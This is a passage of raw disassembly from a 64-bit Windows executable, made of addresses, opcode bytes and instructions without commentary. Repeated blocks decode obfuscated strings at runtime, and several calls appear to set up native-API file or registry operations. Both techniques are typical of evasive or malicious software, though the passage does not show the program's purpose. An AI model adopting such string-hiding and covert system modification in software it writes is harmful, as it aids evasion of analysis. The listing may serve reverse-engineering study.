   140004b86:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140004b8b:	4c 8d 0d 7e 95 50 00 	lea    0x50957e(%rip),%r9        # 0x14050e110
   140004b92:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   140004b99:	b1 01                	mov    $0x1,%cl
   140004b9b:	4d 89 f0             	mov    %r14,%r8
   140004b9e:	e8 3d e3 ff ff       	call   0x140002ee0
   140004ba3:	80 3d 93 91 50 00 00 	cmpb   $0x0,0x509193(%rip)        # 0x14050dd3d
   140004baa:	0f 84 0a 6c 00 00    	je     0x14000b7ba
   140004bb0:	80 3d 9f 96 50 00 00 	cmpb   $0x0,0x50969f(%rip)        # 0x14050e256
   140004bb7:	0f 84 dd 00 00 00    	je     0x140004c9a
   140004bbd:	66 0f 6f 05 cb fb 00 	movdqa 0xfbcb(%rip),%xmm0        # 0x140014790
   140004bc4:	00 
   140004bc5:	66 0f 6f 0d 23 96 50 	movdqa 0x509623(%rip),%xmm1        # 0x14050e1f0
   140004bcc:	00 
   140004bcd:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004bd1:	66 0f 6f 15 67 fa 00 	movdqa 0xfa67(%rip),%xmm2        # 0x140014640
   140004bd8:	00 
   140004bd9:	66 0f db ca          	pand   %xmm2,%xmm1
   140004bdd:	66 0f 7f 0d 0b 96 50 	movdqa %xmm1,0x50960b(%rip)        # 0x14050e1f0
   140004be4:	00 
   140004be5:	66 0f 6f 0d 13 96 50 	movdqa 0x509613(%rip),%xmm1        # 0x14050e200
   140004bec:	00 
   140004bed:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004bf1:	66 0f db ca          	pand   %xmm2,%xmm1
   140004bf5:	66 0f 7f 0d 03 96 50 	movdqa %xmm1,0x509603(%rip)        # 0x14050e200
   140004bfc:	00 
   140004bfd:	66 0f 6f 0d 0b 96 50 	movdqa 0x50960b(%rip),%xmm1        # 0x14050e210
   140004c04:	00 
   140004c05:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004c09:	66 0f db ca          	pand   %xmm2,%xmm1
   140004c0d:	66 0f 7f 0d fb 95 50 	movdqa %xmm1,0x5095fb(%rip)        # 0x14050e210
   140004c14:	00 
   140004c15:	66 0f 6f 0d 03 96 50 	movdqa 0x509603(%rip),%xmm1        # 0x14050e220
   140004c1c:	00 
   140004c1d:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004c21:	66 0f db ca          	pand   %xmm2,%xmm1
   140004c25:	66 0f 7f 0d f3 95 50 	movdqa %xmm1,0x5095f3(%rip)        # 0x14050e220
   140004c2c:	00 
   140004c2d:	66 0f 6f 0d fb 95 50 	movdqa 0x5095fb(%rip),%xmm1        # 0x14050e230
   140004c34:	00 
   140004c35:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004c39:	66 0f db ca          	pand   %xmm2,%xmm1
   140004c3d:	66 0f 7f 0d eb 95 50 	movdqa %xmm1,0x5095eb(%rip)        # 0x14050e230
   140004c44:	00 
   140004c45:	66 0f fd 05 f3 95 50 	paddw  0x5095f3(%rip),%xmm0        # 0x14050e240
   140004c4c:	00 
   140004c4d:	66 0f db c2          	pand   %xmm2,%xmm0
   140004c51:	66 0f 7f 05 e7 95 50 	movdqa %xmm0,0x5095e7(%rip)        # 0x14050e240
   140004c58:	00 
   140004c59:	8b 05 f1 95 50 00    	mov    0x5095f1(%rip),%eax        # 0x14050e250
   140004c5f:	83 c0 79             	add    $0x79,%eax
   140004c62:	0f b6 c0             	movzbl %al,%eax
   140004c65:	66 89 05 e4 95 50 00 	mov    %ax,0x5095e4(%rip)        # 0x14050e250
   140004c6c:	0f b7 05 df 95 50 00 	movzwl 0x5095df(%rip),%eax        # 0x14050e252
   140004c73:	83 c0 79             	add    $0x79,%eax
   140004c76:	0f b6 c0             	movzbl %al,%eax
   140004c79:	66 89 05 d2 95 50 00 	mov    %ax,0x5095d2(%rip)        # 0x14050e252
   140004c80:	8b 05 ce 95 50 00    	mov    0x5095ce(%rip),%eax        # 0x14050e254
   140004c86:	83 c0 79             	add    $0x79,%eax
   140004c89:	0f b6 c0             	movzbl %al,%eax
   140004c8c:	66 89 05 c1 95 50 00 	mov    %ax,0x5095c1(%rip)        # 0x14050e254
   140004c93:	c6 05 bc 95 50 00 00 	movb   $0x0,0x5095bc(%rip)        # 0x14050e256
   140004c9a:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140004c9f:	4c 8d 0d 4a 95 50 00 	lea    0x50954a(%rip),%r9        # 0x14050e1f0
   140004ca6:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   140004cad:	31 c9                	xor    %ecx,%ecx
   140004caf:	4d 89 f8             	mov    %r15,%r8
   140004cb2:	e8 29 e2 ff ff       	call   0x140002ee0
   140004cb7:	48 8d 8d 00 08 00 00 	lea    0x800(%rbp),%rcx
   140004cbe:	41 b8 08 02 00 00    	mov    $0x208,%r8d
   140004cc4:	31 d2                	xor    %edx,%edx
   140004cc6:	e8 c5 e3 00 00       	call   0x140013090
   140004ccb:	80 3d 6c 90 50 00 00 	cmpb   $0x0,0x50906c(%rip)        # 0x14050dd3e
   140004cd2:	0f 84 75 6b 00 00    	je     0x14000b84d
   140004cd8:	80 3d 93 95 50 00 00 	cmpb   $0x0,0x509593(%rip)        # 0x14050e272
   140004cdf:	74 3a                	je     0x140004d1b
   140004ce1:	66 0f 6f 05 77 95 50 	movdqa 0x509577(%rip),%xmm0        # 0x14050e260
   140004ce8:	00 
   140004ce9:	66 0f fd 05 bf fa 00 	paddw  0xfabf(%rip),%xmm0        # 0x1400147b0
   140004cf0:	00 
   140004cf1:	66 0f db 05 47 f9 00 	pand   0xf947(%rip),%xmm0        # 0x140014640
   140004cf8:	00 
   140004cf9:	66 0f 7f 05 5f 95 50 	movdqa %xmm0,0x50955f(%rip)        # 0x14050e260
   140004d00:	00 
   140004d01:	8b 05 69 95 50 00    	mov    0x509569(%rip),%eax        # 0x14050e270
   140004d07:	83 c0 0b             	add    $0xb,%eax
   140004d0a:	0f b6 c0             	movzbl %al,%eax
   140004d0d:	66 89 05 5c 95 50 00 	mov    %ax,0x50955c(%rip)        # 0x14050e270
   140004d14:	c6 05 57 95 50 00 00 	movb   $0x0,0x509557(%rip)        # 0x14050e272
   140004d1b:	4c 8d b5 00 08 00 00 	lea    0x800(%rbp),%r14
   140004d22:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   140004d29:	4c 89 f1             	mov    %r14,%rcx
   140004d2c:	e8 5f e2 00 00       	call   0x140012f90
   140004d31:	48 8d 15 28 95 50 00 	lea    0x509528(%rip),%rdx        # 0x14050e260
   140004d38:	4c 89 f1             	mov    %r14,%rcx
   140004d3b:	e8 40 e2 00 00       	call   0x140012f80
   140004d40:	4c 8d b5 70 16 00 00 	lea    0x1670(%rbp),%r14
   140004d47:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   140004d4d:	4c 89 f1             	mov    %r14,%rcx
   140004d50:	31 d2                	xor    %edx,%edx
   140004d52:	e8 39 e3 00 00       	call   0x140013090
   140004d57:	80 3d cb 8f 50 00 00 	cmpb   $0x0,0x508fcb(%rip)        # 0x14050dd29
   140004d5e:	0f 84 2e 6b 00 00    	je     0x14000b892
   140004d64:	80 3d 67 90 50 00 00 	cmpb   $0x0,0x509067(%rip)        # 0x14050ddd2
   140004d6b:	74 3a                	je     0x140004da7
   140004d6d:	f3 0f 7e 05 53 90 50 	movq   0x509053(%rip),%xmm0        # 0x14050ddc8
   140004d74:	00 
   140004d75:	66 0f fd 05 43 fa 00 	paddw  0xfa43(%rip),%xmm0        # 0x1400147c0
   140004d7c:	00 
   140004d7d:	66 0f db 05 fb f8 00 	pand   0xf8fb(%rip),%xmm0        # 0x140014680
   140004d84:	00 
   140004d85:	66 0f d6 05 3b 90 50 	movq   %xmm0,0x50903b(%rip)        # 0x14050ddc8
   140004d8c:	00 
   140004d8d:	8b 05 3d 90 50 00    	mov    0x50903d(%rip),%eax        # 0x14050ddd0
   140004d93:	83 c0 45             	add    $0x45,%eax
   140004d96:	0f b6 c0             	movzbl %al,%eax
   140004d99:	66 89 05 30 90 50 00 	mov    %ax,0x509030(%rip)        # 0x14050ddd0
   140004da0:	c6 05 2b 90 50 00 00 	movb   $0x0,0x50902b(%rip)        # 0x14050ddd2
   140004da7:	48 8d 15 1a 90 50 00 	lea    0x50901a(%rip),%rdx        # 0x14050ddc8
   140004dae:	4c 89 f1             	mov    %r14,%rcx
   140004db1:	e8 da e1 00 00       	call   0x140012f90
   140004db6:	48 8d 95 00 08 00 00 	lea    0x800(%rbp),%rdx
   140004dbd:	4c 89 f1             	mov    %r14,%rcx
   140004dc0:	e8 bb e1 00 00       	call   0x140012f80
   140004dc5:	48 c7 85 30 0e 00 00 	movq   $0x0,0xe30(%rbp)
   140004dcc:	00 00 00 00 
   140004dd0:	4c 89 f1             	mov    %r14,%rcx
   140004dd3:	e8 c8 e1 00 00       	call   0x140012fa0
   140004dd8:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004ddf:	01 c0                	add    %eax,%eax
   140004de1:	66 89 8d 32 0e 00 00 	mov    %cx,0xe32(%rbp)
   140004de8:	66 89 85 30 0e 00 00 	mov    %ax,0xe30(%rbp)
   140004def:	4c 89 b5 38 0e 00 00 	mov    %r14,0xe38(%rbp)
   140004df6:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140004dfa:	66 0f 7f 85 40 10 00 	movdqa %xmm0,0x1040(%rbp)
   140004e01:	00 
   140004e02:	66 0f 7f 85 50 10 00 	movdqa %xmm0,0x1050(%rbp)
   140004e09:	00 
   140004e0a:	c7 85 40 10 00 00 30 	movl   $0x30,0x1040(%rbp)
   140004e11:	00 00 00 
   140004e14:	c7 85 58 10 00 00 40 	movl   $0x40,0x1058(%rbp)
   140004e1b:	00 00 00 
   140004e1e:	48 8d 85 30 0e 00 00 	lea    0xe30(%rbp),%rax
   140004e25:	48 89 85 50 10 00 00 	mov    %rax,0x1050(%rbp)
   140004e2c:	66 0f 7f 85 60 10 00 	movdqa %xmm0,0x1060(%rbp)
   140004e33:	00 
   140004e34:	48 c7 85 10 19 00 00 	movq   $0x0,0x1910(%rbp)
   140004e3b:	00 00 00 00 
   140004e3f:	66 0f 7f 85 60 14 00 	movdqa %xmm0,0x1460(%rbp)
   140004e46:	00 
   140004e47:	c7 44 24 28 20 00 00 	movl   $0x20,0x28(%rsp)
   140004e4e:	00 
   140004e4f:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140004e56:	00 
   140004e57:	4c 8d bd 10 19 00 00 	lea    0x1910(%rbp),%r15
   140004e5e:	4c 8d b5 40 10 00 00 	lea    0x1040(%rbp),%r14
   140004e65:	4c 8d 8d 60 14 00 00 	lea    0x1460(%rbp),%r9
   140004e6c:	4c 89 f9             	mov    %r15,%rcx
   140004e6f:	ba 00 00 11 40       	mov    $0x40110000,%edx
   140004e74:	4d 89 f0             	mov    %r14,%r8
   140004e77:	e8 f1 c5 ff ff       	call   0x14000146d
   140004e7c:	85 c0                	test   %eax,%eax
   140004e7e:	78 3b                	js     0x140004ebb
   140004e80:	c6 85 58 19 00 00 01 	movb   $0x1,0x1958(%rbp)
   140004e87:	48 8b 8d 10 19 00 00 	mov    0x1910(%rbp),%rcx
   140004e8e:	c7 44 24 20 0d 00 00 	movl   $0xd,0x20(%rsp)
   140004e95:	00 
   140004e96:	48 8d 95 60 14 00 00 	lea    0x1460(%rbp),%rdx
   140004e9d:	4c 8d 85 58 19 00 00 	lea    0x1958(%rbp),%r8
   140004ea4:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140004eaa:	e8 55 c5 ff ff       	call   0x140001404
   140004eaf:	48 8b 8d 10 19 00 00 	mov    0x1910(%rbp),%rcx
   140004eb6:	e8 a3 c5 ff ff       	call   0x14000145e
   140004ebb:	48 c7 85 00 19 00 00 	movq   $0x0,0x1900(%rbp)
   140004ec2:	00 00 00 00 
   140004ec6:	80 3d 72 8e 50 00 00 	cmpb   $0x0,0x508e72(%rip)        # 0x14050dd3f
   140004ecd:	0f 84 05 6a 00 00    	je     0x14000b8d8
   140004ed3:	48 8d b5 b0 18 00 00 	lea    0x18b0(%rbp),%rsi
   140004eda:	80 3d 03 94 50 00 00 	cmpb   $0x0,0x509403(%rip)        # 0x14050e2e4
   140004ee1:	0f 84 ca 00 00 00    	je     0x140004fb1
   140004ee7:	66 0f 6f 05 e1 f8 00 	movdqa 0xf8e1(%rip),%xmm0        # 0x1400147d0
   140004eee:	00 
   140004eef:	66 0f 6f 0d 89 93 50 	movdqa 0x509389(%rip),%xmm1        # 0x14050e280
   140004ef6:	00 
   140004ef7:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004efb:	66 0f 6f 15 3d f7 00 	movdqa 0xf73d(%rip),%xmm2        # 0x140014640
   140004f02:	00 
   140004f03:	66 0f db ca          	pand   %xmm2,%xmm1
   140004f07:	66 0f 7f 0d 71 93 50 	movdqa %xmm1,0x509371(%rip)        # 0x14050e280
   140004f0e:	00 
   140004f0f:	66 0f 6f 0d 79 93 50 	movdqa 0x509379(%rip),%xmm1        # 0x14050e290
   140004f16:	00 
   140004f17:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004f1b:	66 0f db ca          	pand   %xmm2,%xmm1
   140004f1f:	66 0f 7f 0d 69 93 50 	movdqa %xmm1,0x509369(%rip)        # 0x14050e290
   140004f26:	00 
   140004f27:	66 0f 6f 0d 71 93 50 	movdqa 0x509371(%rip),%xmm1        # 0x14050e2a0
   140004f2e:	00 
   140004f2f:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004f33:	66 0f db ca          	pand   %xmm2,%xmm1
   140004f37:	66 0f 7f 0d 61 93 50 	movdqa %xmm1,0x509361(%rip)        # 0x14050e2a0
   140004f3e:	00 
   140004f3f:	66 0f 6f 0d 69 93 50 	movdqa 0x509369(%rip),%xmm1        # 0x14050e2b0
   140004f46:	00 
   140004f47:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004f4b:	66 0f db ca          	pand   %xmm2,%xmm1
   140004f4f:	66 0f 7f 0d 59 93 50 	movdqa %xmm1,0x509359(%rip)        # 0x14050e2b0
   140004f56:	00 
   140004f57:	66 0f 6f 0d 61 93 50 	movdqa 0x509361(%rip),%xmm1        # 0x14050e2c0
   140004f5e:	00 
   140004f5f:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140004f63:	66 0f db ca          	pand   %xmm2,%xmm1
   140004f67:	66 0f 7f 0d 51 93 50 	movdqa %xmm1,0x509351(%rip)        # 0x14050e2c0
   140004f6e:	00 
   140004f6f:	66 0f fd 05 59 93 50 	paddw  0x509359(%rip),%xmm0        # 0x14050e2d0
   140004f76:	00 
   140004f77:	66 0f db c2          	pand   %xmm2,%xmm0
   140004f7b:	66 0f 7f 05 4d 93 50 	movdqa %xmm0,0x50934d(%rip)        # 0x14050e2d0
   140004f82:	00 
   140004f83:	8b 05 57 93 50 00    	mov    0x509357(%rip),%eax        # 0x14050e2e0
   140004f89:	83 c0 0d             	add    $0xd,%eax
   140004f8c:	0f b6 c0             	movzbl %al,%eax
   140004f8f:	66 89 05 4a 93 50 00 	mov    %ax,0x50934a(%rip)        # 0x14050e2e0
   140004f96:	0f b7 05 45 93 50 00 	movzwl 0x509345(%rip),%eax        # 0x14050e2e2
   140004f9d:	83 c0 0d             	add    $0xd,%eax
   140004fa0:	0f b6 c0             	movzbl %al,%eax
   140004fa3:	66 89 05 38 93 50 00 	mov    %ax,0x509338(%rip)        # 0x14050e2e2
   140004faa:	c6 05 33 93 50 00 00 	movb   $0x0,0x509333(%rip)        # 0x14050e2e4
   140004fb1:	48 c7 85 d0 18 00 00 	movq   $0x0,0x18d0(%rbp)
   140004fb8:	00 00 00 00 
   140004fbc:	4c 8d 25 bd 92 50 00 	lea    0x5092bd(%rip),%r12        # 0x14050e280
   140004fc3:	4c 89 e1             	mov    %r12,%rcx
   140004fc6:	e8 d5 df 00 00       	call   0x140012fa0
   140004fcb:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140004fd2:	01 c0                	add    %eax,%eax
   140004fd4:	66 89 8d d2 18 00 00 	mov    %cx,0x18d2(%rbp)
   140004fdb:	66 89 85 d0 18 00 00 	mov    %ax,0x18d0(%rbp)
   140004fe2:	4c 89 a5 d8 18 00 00 	mov    %r12,0x18d8(%rbp)
   140004fe9:	c7 85 90 18 00 00 30 	movl   $0x30,0x1890(%rbp)
   140004ff0:	00 00 00 
   140004ff3:	48 c7 85 98 18 00 00 	movq   $0x0,0x1898(%rbp)
   140004ffa:	00 00 00 00 
   140004ffe:	c7 85 a8 18 00 00 40 	movl   $0x40,0x18a8(%rbp)
   140005005:	00 00 00 
   140005008:	48 8d 85 d0 18 00 00 	lea    0x18d0(%rbp),%rax
   14000500f:	48 89 85 a0 18 00 00 	mov    %rax,0x18a0(%rbp)
   140005016:	66 0f ef c0          	pxor   %xmm0,%xmm0
   14000501a:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   14000501e:	48 8d 8d 00 19 00 00 	lea    0x1900(%rbp),%rcx
   140005025:	4c 8d 85 90 18 00 00 	lea    0x1890(%rbp),%r8
   14000502c:	ba 03 00 00 00       	mov    $0x3,%edx
   140005031:	e8 45 c5 ff ff       	call   0x14000157b
   140005036:	85 c0                	test   %eax,%eax
   140005038:	79 35                	jns    0x14000506f
   14000503a:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140005041:	00 00 
   140005043:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
   14000504a:	00 
   14000504b:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140005052:	00 00 
   140005054:	48 8d 8d 00 19 00 00 	lea    0x1900(%rbp),%rcx
   14000505b:	4c 8d 85 90 18 00 00 	lea    0x1890(%rbp),%r8
   140005062:	ba 03 00 00 00       	mov    $0x3,%edx
   140005067:	45 31 c9             	xor    %r9d,%r9d
   14000506a:	e8 1b c5 ff ff       	call   0x14000158a
   14000506f:	48 83 bd 00 19 00 00 	cmpq   $0x0,0x1900(%rbp)
   140005076:	00 
   140005077:	0f 84 05 01 00 00    	je     0x140005182
   14000507d:	c7 85 40 10 00 00 01 	movl   $0x1,0x1040(%rbp)
   140005084:	00 00 00 
   140005087:	80 3d b2 8c 50 00 00 	cmpb   $0x0,0x508cb2(%rip)        # 0x14050dd40
   14000508e:	0f 84 94 70 00 00    	je     0x14000c128
   140005094:	80 3d 7f 92 50 00 00 	cmpb   $0x0,0x50927f(%rip)        # 0x14050e31a
   14000509b:	74 78                	je     0x140005115
   14000509d:	66 0f 6f 05 3b f7 00 	movdqa 0xf73b(%rip),%xmm0        # 0x1400147e0
   1400050a4:	00 
   1400050a5:	66 0f 6f 0d 43 92 50 	movdqa 0x509243(%rip),%xmm1        # 0x14050e2f0
   1400050ac:	00 
   1400050ad:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400050b1:	66 0f 6f 15 87 f5 00 	movdqa 0xf587(%rip),%xmm2        # 0x140014640
   1400050b8:	00 
   1400050b9:	66 0f db ca          	pand   %xmm2,%xmm1
   1400050bd:	66 0f 7f 0d 2b 92 50 	movdqa %xmm1,0x50922b(%rip)        # 0x14050e2f0
   1400050c4:	00 
   1400050c5:	66 0f fd 05 33 92 50 	paddw  0x509233(%rip),%xmm0        # 0x14050e300
   1400050cc:	00 
   1400050cd:	66 0f db c2          	pand   %xmm2,%xmm0
   1400050d1:	66 0f 7f 05 27 92 50 	movdqa %xmm0,0x509227(%rip)        # 0x14050e300
   1400050d8:	00 
   1400050d9:	f3 0f 7e 05 2f 92 50 	movq   0x50922f(%rip),%xmm0        # 0x14050e310
   1400050e0:	00 
   1400050e1:	66 0f fd 05 07 f7 00 	paddw  0xf707(%rip),%xmm0        # 0x1400147f0
   1400050e8:	00 
   1400050e9:	66 0f db 05 8f f5 00 	pand   0xf58f(%rip),%xmm0        # 0x140014680
   1400050f0:	00 
   1400050f1:	66 0f d6 05 17 92 50 	movq   %xmm0,0x509217(%rip)        # 0x14050e310
   1400050f8:	00 
   1400050f9:	b8 89 00 00 00       	mov    $0x89,%eax
   1400050fe:	03 05 14 92 50 00    	add    0x509214(%rip),%eax        # 0x14050e318
   140005104:	0f b6 c0             	movzbl %al,%eax
   140005107:	66 89 05 0a 92 50 00 	mov    %ax,0x50920a(%rip)        # 0x14050e318
   14000510e:	c6 05 05 92 50 00 00 	movb   $0x0,0x509205(%rip)        # 0x14050e31a
   140005115:	48 c7 85 70 16 00 00 	movq   $0x0,0x1670(%rbp)
   14000511c:	00 00 00 00 
   140005120:	4c 8d 25 c9 91 50 00 	lea    0x5091c9(%rip),%r12        # 0x14050e2f0
   140005127:	4c 89 e1             	mov    %r12,%rcx
   14000512a:	e8 71 de 00 00       	call   0x140012fa0
   14000512f:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140005136:	01 c0                	add    %eax,%eax
   140005138:	66 89 8d 72 16 00 00 	mov    %cx,0x1672(%rbp)
   14000513f:	66 89 85 70 16 00 00 	mov    %ax,0x1670(%rbp)
   140005146:	4c 89 a5 78 16 00 00 	mov    %r12,0x1678(%rbp)
   14000514d:	48 8b 8d 00 19 00 00 	mov    0x1900(%rbp),%rcx
   140005154:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140005159:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140005160:	00 
   140005161:	48 8d 95 70 16 00 00 	lea    0x1670(%rbp),%rdx
   140005168:	45 31 c0             	xor    %r8d,%r8d
   14000516b:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140005171:	e8 6e c4 ff ff       	call   0x1400015e4
   140005176:	48 8b 8d 00 19 00 00 	mov    0x1900(%rbp),%rcx
   14000517d:	e8 dc c2 ff ff       	call   0x14000145e
   140005182:	80 3d b8 8b 50 00 00 	cmpb   $0x0,0x508bb8(%rip)        # 0x14050dd41
   140005189:	0f 84 c8 67 00 00    	je     0x14000b957
   14000518f:	80 3d a8 91 50 00 00 	cmpb   $0x0,0x5091a8(%rip)        # 0x14050e33e
   140005196:	74 7a                	je     0x140005212
   140005198:	66 0f 6f 05 80 91 50 	movdqa 0x509180(%rip),%xmm0        # 0x14050e320
   14000519f:	00 
   1400051a0:	66 0f fd 05 68 f6 00 	paddw  0xf668(%rip),%xmm0        # 0x140014810
   1400051a7:	00 
   1400051a8:	66 0f db 05 90 f4 00 	pand   0xf490(%rip),%xmm0        # 0x140014640
   1400051af:	00 
   1400051b0:	66 0f 7f 05 68 91 50 	movdqa %xmm0,0x509168(%rip)        # 0x14050e320
   1400051b7:	00 
   1400051b8:	f3 0f 7e 05 70 91 50 	movq   0x509170(%rip),%xmm0        # 0x14050e330
   1400051bf:	00 
   1400051c0:	66 0f fd 05 58 f6 00 	paddw  0xf658(%rip),%xmm0        # 0x140014820
   1400051c7:	00 
   1400051c8:	66 0f db 05 b0 f4 00 	pand   0xf4b0(%rip),%xmm0        # 0x140014680
   1400051cf:	00 
   1400051d0:	66 0f d6 05 58 91 50 	movq   %xmm0,0x509158(%rip)        # 0x14050e330
   1400051d7:	00 
   1400051d8:	f3 0f 7e 05 58 91 50 	movq   0x509158(%rip),%xmm0        # 0x14050e338
   1400051df:	00 
   1400051e0:	66 0f fd 05 48 f6 00 	paddw  0xf648(%rip),%xmm0        # 0x140014830
   1400051e7:	00 
   1400051e8:	66 0f db 05 c0 f4 00 	pand   0xf4c0(%rip),%xmm0        # 0x1400146b0
   1400051ef:	00 
   1400051f0:	66 0f 7e 05 40 91 50 	movd   %xmm0,0x509140(%rip)        # 0x14050e338
   1400051f7:	00 
   1400051f8:	8b 05 3e 91 50 00    	mov    0x50913e(%rip),%eax        # 0x14050e33c
   1400051fe:	83 c0 6b             	add    $0x6b,%eax
   140005201:	0f b6 c0             	movzbl %al,%eax
   140005204:	66 89 05 31 91 50 00 	mov    %ax,0x509131(%rip)        # 0x14050e33c
   14000520b:	c6 05 2c 91 50 00 00 	movb   $0x0,0x50912c(%rip)        # 0x14050e33e
   140005212:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140005217:	4c 8d 0d 02 91 50 00 	lea    0x509102(%rip),%r9        # 0x14050e320
   14000521e:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   140005225:	b1 01                	mov    $0x1,%cl
   140005227:	49 89 f8             	mov    %rdi,%r8
   14000522a:	e8 b1 dc ff ff       	call   0x140002ee0
   14000522f:	80 3d 0c 8b 50 00 00 	cmpb   $0x0,0x508b0c(%rip)        # 0x14050dd42
   140005236:	0f 84 7b 67 00 00    	je     0x14000b9b7
   14000523c:	80 3d 27 91 50 00 00 	cmpb   $0x0,0x509127(%rip)        # 0x14050e36a
   140005243:	74 78                	je     0x1400052bd
   140005245:	66 0f 6f 05 f3 f5 00 	movdqa 0xf5f3(%rip),%xmm0        # 0x140014840
   14000524c:	00 
   14000524d:	66 0f 6f 0d eb 90 50 	movdqa 0x5090eb(%rip),%xmm1        # 0x14050e340
   140005254:	00 
   140005255:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140005259:	66 0f 6f 15 df f3 00 	movdqa 0xf3df(%rip),%xmm2        # 0x140014640
   140005260:	00 
   140005261:	66 0f db ca          	pand   %xmm2,%xmm1
   140005265:	66 0f 7f 0d d3 90 50 	movdqa %xmm1,0x5090d3(%rip)        # 0x14050e340
   14000526c:	00 
   14000526d:	66 0f fd 05 db 90 50 	paddw  0x5090db(%rip),%xmm0        # 0x14050e350
   140005274:	00 
   140005275:	66 0f db c2          	pand   %xmm2,%xmm0
   140005279:	66 0f 7f 05 cf 90 50 	movdqa %xmm0,0x5090cf(%rip)        # 0x14050e350
   140005280:	00 
   140005281:	f3 0f 7e 05 d7 90 50 	movq   0x5090d7(%rip),%xmm0        # 0x14050e360
   140005288:	00 
   140005289:	66 0f fd 05 bf f5 00 	paddw  0xf5bf(%rip),%xmm0        # 0x140014850
   140005290:	00 
   140005291:	66 0f db 05 e7 f3 00 	pand   0xf3e7(%rip),%xmm0        # 0x140014680
   140005298:	00 
   140005299:	66 0f d6 05 bf 90 50 	movq   %xmm0,0x5090bf(%rip)        # 0x14050e360
   1400052a0:	00 
   1400052a1:	b8 ad 00 00 00       	mov    $0xad,%eax
   1400052a6:	03 05 bc 90 50 00    	add    0x5090bc(%rip),%eax        # 0x14050e368
   1400052ac:	0f b6 c0             	movzbl %al,%eax
   1400052af:	66 89 05 b2 90 50 00 	mov    %ax,0x5090b2(%rip)        # 0x14050e368
   1400052b6:	c6 05 ad 90 50 00 00 	movb   $0x0,0x5090ad(%rip)        # 0x14050e36a
   1400052bd:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400052c2:	4c 8d 0d 77 90 50 00 	lea    0x509077(%rip),%r9        # 0x14050e340
   1400052c9:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   1400052d0:	b1 01                	mov    $0x1,%cl
   1400052d2:	49 89 f8             	mov    %rdi,%r8
   1400052d5:	e8 06 dc ff ff       	call   0x140002ee0
   1400052da:	80 3d 62 8a 50 00 00 	cmpb   $0x0,0x508a62(%rip)        # 0x14050dd43
   1400052e1:	0f 84 01 67 00 00    	je     0x14000b9e8
   1400052e7:	80 3d a4 90 50 00 00 	cmpb   $0x0,0x5090a4(%rip)        # 0x14050e392
   1400052ee:	74 56                	je     0x140005346
   1400052f0:	66 0f 6f 05 68 f5 00 	movdqa 0xf568(%rip),%xmm0        # 0x140014860
   1400052f7:	00 
   1400052f8:	66 0f 6f 0d 70 90 50 	movdqa 0x509070(%rip),%xmm1        # 0x14050e370
   1400052ff:	00 
   140005300:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140005304:	66 0f 6f 15 34 f3 00 	movdqa 0xf334(%rip),%xmm2        # 0x140014640
   14000530b:	00 
   14000530c:	66 0f db ca          	pand   %xmm2,%xmm1
   140005310:	66 0f 7f 0d 58 90 50 	movdqa %xmm1,0x509058(%rip)        # 0x14050e370
   140005317:	00 
   140005318:	66 0f fd 05 60 90 50 	paddw  0x509060(%rip),%xmm0        # 0x14050e380
   14000531f:	00 
   140005320:	66 0f db c2          	pand   %xmm2,%xmm0
   140005324:	66 0f 7f 05 54 90 50 	movdqa %xmm0,0x509054(%rip)        # 0x14050e380
   14000532b:	00 
   14000532c:	8b 05 5e 90 50 00    	mov    0x50905e(%rip),%eax        # 0x14050e390
   140005332:	83 c0 69             	add    $0x69,%eax
   140005335:	0f b6 c0             	movzbl %al,%eax
   140005338:	66 89 05 51 90 50 00 	mov    %ax,0x509051(%rip)        # 0x14050e390
   14000533f:	c6 05 4c 90 50 00 00 	movb   $0x0,0x50904c(%rip)        # 0x14050e392
   140005346:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000534b:	4c 8d 0d 1e 90 50 00 	lea    0x50901e(%rip),%r9        # 0x14050e370
   140005352:	48 8d 95 50 12 00 00 	lea    0x1250(%rbp),%rdx
   140005359:	b1 01                	mov    $0x1,%cl
   14000535b:	49 89 f8             	mov    %rdi,%r8
   14000535e:	e8 7d db ff ff       	call   0x140002ee0
   140005363:	80 3d da 89 50 00 00 	cmpb   $0x0,0x5089da(%rip)        # 0x14050dd44
   14000536a:	0f 84 a9 66 00 00    	je     0x14000ba19
   140005370:	80 3d 43 90 50 00 00 	cmpb   $0x0,0x509043(%rip)        # 0x14050e3ba
   140005377:	74 5a                	je     0x1400053d3
   140005379:	66 0f 6f 05 1f 90 50 	movdqa 0x50901f(%rip),%xmm0        # 0x14050e3a0
   140005380:	00 
